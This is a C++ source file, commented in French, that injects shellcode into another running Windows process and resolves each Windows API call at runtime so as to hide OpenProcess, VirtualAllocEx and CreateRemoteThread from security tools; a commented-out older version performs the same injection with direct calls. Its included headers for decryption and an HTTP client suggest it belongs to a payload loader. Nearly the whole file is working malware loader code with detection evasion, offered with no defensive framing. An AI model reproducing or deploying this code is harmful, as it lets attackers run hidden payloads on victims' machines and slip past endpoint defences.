#include <iostream>
#include <stdio.h>
#include <Windows.h>
#include <tchar.h>

#include "Decrypt.h"
#include "DynamicInvoke.h"
#include "HTTPClient.h"
#include "Memory.h"  

// On veut masquer openprocess et virtualalloc
// Fonction pour injecter le shellcode dans le processus local
bool injectShellcode(LPVOID shellcode, SIZE_T shellcodeSize, DWORD targetPid) {
    // Étape 1 : Masquer l'appel à OpenProcess
    typedef HANDLE(WINAPI* OpenProcess_t)(DWORD, BOOL, DWORD);
    OpenProcess_t myOpenProcess = (OpenProcess_t)GetDynamicFunctionFromModule("kernel32.dll", "OpenProcess");

    HANDLE hProcess = myOpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (hProcess == NULL) {
        std::cerr << "Erreur : Impossible d'ouvrir le processus cible !" << std::endl;
        return false;
    }
    std::cout << "Processus cible ouvert avec succès." << std::endl;

    // Étape 2 : Masquer l'appel à VirtualAllocEx
    typedef LPVOID(WINAPI* VirtualAllocEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    VirtualAllocEx_t myVirtualAllocEx = (VirtualAllocEx_t)GetDynamicFunctionFromModule("kernel32.dll", "VirtualAllocEx");

    LPVOID remoteAddr = myVirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (remoteAddr == NULL) {
        std::cerr << "Erreur : Échec de l'allocation mémoire dans le processus !" << std::endl;

        // Libérer les ressources
        typedef BOOL(WINAPI* CloseHandle_t)(HANDLE);
        CloseHandle_t myCloseHandle = (CloseHandle_t)GetDynamicFunctionFromModule("kernel32.dll", "CloseHandle");
        myCloseHandle(hProcess);

        return false;
    }
    std::cout << "Mémoire allouée à distance à l'adresse : " << remoteAddr << std::endl;

    // Étape 3 : Masquer l'appel à WriteProcessMemory
    typedef BOOL(WINAPI* WriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
    WriteProcessMemory_t myWriteProcessMemory = (WriteProcessMemory_t)GetDynamicFunctionFromModule("kernel32.dll", "WriteProcessMemory");

    SIZE_T bytesWritten;
    BOOL success = myWriteProcessMemory(hProcess, remoteAddr, shellcode, shellcodeSize, &bytesWritten);
    if (!success || bytesWritten != shellcodeSize) {
        std::cerr << "Erreur : Échec de l'écriture du shellcode dans la mémoire !" << std::endl;

        // Libérer les ressources
        typedef BOOL(WINAPI* VirtualFreeEx_t)(HANDLE, LPVOID, SIZE_T, DWORD);
        VirtualFreeEx_t myVirtualFreeEx = (VirtualFreeEx_t)GetDynamicFunctionFromModule("kernel32.dll", "VirtualFreeEx");
        myVirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);

        typedef BOOL(WINAPI* CloseHandle_t)(HANDLE);
        CloseHandle_t myCloseHandle = (CloseHandle_t)GetDynamicFunctionFromModule("kernel32.dll", "CloseHandle");
        myCloseHandle(hProcess);

        return false;
    }
    std::cout << "Shellcode écrit avec succès dans la mémoire." << std::endl;

    // Étape 4 : Masquer l'appel à VirtualProtectEx
    typedef BOOL(WINAPI* VirtualProtectEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD*);
    VirtualProtectEx_t myVirtualProtectEx = (VirtualProtectEx_t)GetDynamicFunctionFromModule("kernel32.dll", "VirtualProtectEx");

    DWORD oldProtect;
    if (!myVirtualProtectEx(hProcess, remoteAddr, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "Erreur : Échec de VirtualProtectEx pour rendre la mémoire exécutable !" << std::endl;

        // Libérer les ressources
        typedef BOOL(WINAPI* VirtualFreeEx_t)(HANDLE, LPVOID, SIZE_T, DWORD);
        VirtualFreeEx_t myVirtualFreeEx = (VirtualFreeEx_t)GetDynamicFunctionFromModule("kernel32.dll", "VirtualFreeEx");
        myVirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);

        typedef BOOL(WINAPI* CloseHandle_t)(HANDLE);
        CloseHandle_t myCloseHandle = (CloseHandle_t)GetDynamicFunctionFromModule("kernel32.dll", "CloseHandle");
        myCloseHandle(hProcess);

        return false;
    }
    std::cout << "Permissions changées en PAGE_EXECUTE_READ." << std::endl;

    // Étape 5 : Masquer l'appel à CreateRemoteThread
    typedef HANDLE(WINAPI* CreateRemoteThread_t)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
    CreateRemoteThread_t myCreateRemoteThread = (CreateRemoteThread_t)GetDynamicFunctionFromModule("kernel32.dll", "CreateRemoteThread");

    HANDLE hThread = myCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteAddr, NULL, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "Erreur : Échec de CreateRemoteThread dans le processus !" << std::endl;

        // Libérer les ressources
        typedef BOOL(WINAPI* VirtualFreeEx_t)(HANDLE, LPVOID, SIZE_T, DWORD);
        VirtualFreeEx_t myVirtualFreeEx = (VirtualFreeEx_t)GetDynamicFunctionFromModule("kernel32.dll", "VirtualFreeEx");
        myVirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);

        typedef BOOL(WINAPI* CloseHandle_t)(HANDLE);
        CloseHandle_t myCloseHandle = (CloseHandle_t)GetDynamicFunctionFromModule("kernel32.dll", "CloseHandle");
        myCloseHandle(hProcess);

        return false;
    }
    std::cout << "Thread créé avec succès dans le processus." << std::endl;

    // Attendre que le thread distant termine
    typedef DWORD(WINAPI* WaitForSingleObject_t)(HANDLE, DWORD);
    WaitForSingleObject_t myWaitForSingleObject = (WaitForSingleObject_t)GetDynamicFunctionFromModule("kernel32.dll", "WaitForSingleObject");
    myWaitForSingleObject(hThread, INFINITE);
    std::cout << "Le shellcode a été exécuté dans le processus." << std::endl;

    // Libérer les ressources
    typedef BOOL(WINAPI* CloseHandle_t)(HANDLE);
    CloseHandle_t myCloseHandle = (CloseHandle_t)GetDynamicFunctionFromModule("kernel32.dll", "CloseHandle");

    myCloseHandle(hThread);
    myCloseHandle(hProcess);

    return true;
}

/* Version d'avant : 
// Fonction pour injecter le shellcode dans le processus local
bool injectShellcode(LPVOID shellcode, SIZE_T shellcodeSize, DWORD targetPid) {
    // Étape 1 : Ouvrir le processus cible
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (hProcess == NULL) {
        std::cerr << "Erreur : Impossible d'ouvrir le processus cible !" << std::endl;
        return false;
    }
    std::cout << "Processus cible ouvert avec succès." << std::endl;

    // Étape 2 : Allouer de la mémoire dans le processus distant
    LPVOID remoteAddr = VirtualAllocEx(
        hProcess,
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (remoteAddr == NULL) {
        std::cerr << "Erreur : Échec de l'allocation mémoire dans le processus !" << std::endl;
        CloseHandle(hProcess);
        return false;
    }
    std::cout << "Mémoire allouée à distance à l'adresse : " << remoteAddr << std::endl;

    // Étape 3 : Écrire le shellcode dans la mémoire allouée
    SIZE_T bytesWritten;
    BOOL success = WriteProcessMemory(
        hProcess,
        remoteAddr,
        shellcode,
        shellcodeSize,
        &bytesWritten
    );
    if (!success || bytesWritten != shellcodeSize) {
        std::cerr << "Erreur : Échec de l'écriture du shellcode dans la mémoire !" << std::endl;
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    else {
        std::cout << "Shellcode écrit avec succès dans la mémoire." << std::endl;

    }

    // Étape 4 : Modifier les permissions mémoire pour l'exécution
    DWORD oldProtect;
    if (!VirtualProtectEx(hProcess, remoteAddr, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "Erreur : Échec de VirtualProtectEx pour rendre la mémoire exécutable !" << std::endl;
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    std::cout << "Permissions changées en PAGE_EXECUTE_READ." << std::endl;


    // Étape 5 : Créer un thread pour exécuter le shellcode
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)remoteAddr,
        NULL,
        0,
        NULL
    );
    if (hThread == NULL) {
        std::cerr << "Erreur : Échec de CreateRemoteThread dans le processus !" << std::endl;
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    std::cout << "Thread créé avec succès dans le processus." << std::endl;

    
    WaitForSingleObject(hThread, INFINITE);
    std::cout << "Le shellcode a été exécuté dans le processus." << std::endl;

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}
*/
